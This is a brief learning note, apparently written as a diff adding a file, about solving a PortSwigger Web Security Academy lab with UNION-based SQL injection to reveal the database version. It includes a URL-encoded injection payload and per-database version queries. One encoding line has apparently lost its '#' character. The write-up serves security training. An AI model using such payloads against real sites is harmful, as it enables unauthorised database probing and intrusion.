@@ -1,0 +1,26 @@
+Overview
+Today I completed a PortSwigger Web Security Academy lab focused on identifying the backend database type and version using UNION-based SQL Injection.
+Challenge
+Raw SQL payloads entered directly into the browser URL caused Internal Server Errors because special characters and comments were not being interpreted correctly.
+Solution
+I used URL encoding to preserve the structure of the SQL payload.
+Payload Used
+'+UNION+SELECT+@@version,+NULL%23
+Key Concepts Learned
+Database Version Detection
+MySQL:
+SELECT @@version
+Microsoft SQL Server:
+SELECT @@version
+PostgreSQL:
+SELECT version()
+Oracle:
+SELECT banner FROM v$version
+URL Encoding
+Space = + or %20
+= %23
+' = %27
+Result
+Successfully retrieved the backend MySQL version and solved the lab.
+Key Insight
+Sometimes the vulnerability is not the difficult part. Understanding how browsers encode URLs can be the difference between a failed payload and a successful exploit.
